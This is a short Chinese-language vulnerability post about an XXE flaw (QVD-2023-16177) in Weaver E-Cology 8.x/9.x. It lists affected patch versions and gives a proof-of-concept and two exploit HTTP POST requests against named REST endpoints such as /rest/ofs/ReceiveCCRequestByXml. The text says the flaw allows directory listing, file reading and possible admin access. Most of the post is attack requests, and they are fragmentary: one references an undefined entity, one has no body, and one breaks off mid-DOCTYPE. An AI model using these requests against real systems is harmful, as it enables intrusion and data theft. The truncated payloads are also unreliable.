泛微E-Cology XXE漏洞(QVD-2023-16177)
泛微e-cology某处功能点最初针对用户输入的过滤不太完善，导致在处理用户输入时可触发XXE。攻击者可利用该漏洞列目录、读取文件，甚至可能获取应用系统的管理员权限。
漏洞编号：QVD-2023-16177
漏洞类型：XXE
影响版本：泛微 EC 9.x 且补丁版本 < 10.58.2；泛微 EC 8.x 且补丁版本 < 10.58.2
POC：

POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1Host:***Content-Type: application/xml
<M><syscode>&send;</syscode></M>

EXP1:
POST /rest/ofs/ReceiveCCRequestByXml HTTP/1.1Host:****Content-Type: application/xml

EXP2：
POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1Host:***Content-Type: application/xml
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE syscode SYSTEM "